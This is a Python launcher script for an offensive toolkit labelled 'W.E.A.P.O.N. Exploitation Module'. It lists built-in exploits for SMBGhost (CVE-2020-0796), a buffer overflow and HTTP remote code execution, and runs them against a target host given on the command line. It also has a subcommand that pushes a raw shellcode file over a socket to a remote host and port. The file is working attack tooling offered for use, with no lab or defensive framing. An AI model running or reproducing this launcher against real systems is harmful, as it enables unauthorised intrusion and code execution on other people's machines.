import argparse
import subprocess
import os
import sys

EXPLOIT_PATH = "./modules/exploitation/exploits"

BUILT_IN_EXPLOITS = {
    "smbghost": f"{EXPLOIT_PATH}/cve-2020-0796.py",
    "buffer-overflow": f"{EXPLOIT_PATH}/buffer_overflow_poc.py",
    "http-rce": f"{EXPLOIT_PATH}/http_rce_exploit.py"
}

def list_exploits():
    print("[*] Available built-in exploits:\n")
    for name in BUILT_IN_EXPLOITS:
        print(f" - {name}")

def run_exploit(name, target, args):
    if name not in BUILT_IN_EXPLOITS:
        print(f"[!] Exploit '{name}' not found.")
        sys.exit(1)

    exploit_path = BUILT_IN_EXPLOITS[name]
    if not os.path.exists(exploit_path):
        print(f"[!] Exploit script not found at {exploit_path}")
        sys.exit(1)

    cmd = ["python3", exploit_path, target] + args
    print(f"[*] Running exploit: {' '.join(cmd)}")
    subprocess.run(cmd)

def run_shellcode(host, port, shellcode_file):
    if not os.path.exists(shellcode_file):
        print(f"[!] Shellcode file not found: {shellcode_file}")
        sys.exit(1)

    print(f"[*] Sending shellcode to {host}:{port}...\n")
    with open(shellcode_file, "rb") as f:
        shellcode = f.read()

    try:
        import socket
        s = socket.socket()
        s.connect((host, int(port)))
        s.sendall(shellcode)
        print("[+] Shellcode sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send shellcode: {e}")

def main():
    parser = argparse.ArgumentParser(description="W.E.A.P.O.N. Exploitation Module")
    sub = parser.add_subparsers(dest="command")

    sub.add_parser("list", help="List available exploits")

    run_exp = sub.add_parser("run", help="Run a built-in exploit")
    run_exp.add_argument("exploit", help="Exploit name (e.g. smbghost)")
    run_exp.add_argument("target", help="Target IP or hostname")
    run_exp.add_argument("args", nargs=argparse.REMAINDER, help="Additional args to exploit")

    shell = sub.add_parser("shellcode", help="Send raw shellcode to remote listener")
    shell.add_argument("host", help="Target IP")
    shell.add_argument("port", help="Target port")
    shell.add_argument("file", help="Shellcode binary file")

    args = parser.parse_args()

    if args.command == "list":
        list_exploits()
    elif args.command == "run":
        run_exploit(args.exploit, args.target, args.args)
    elif args.command == "shellcode":
        run_shellcode(args.host, args.port, args.file)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()

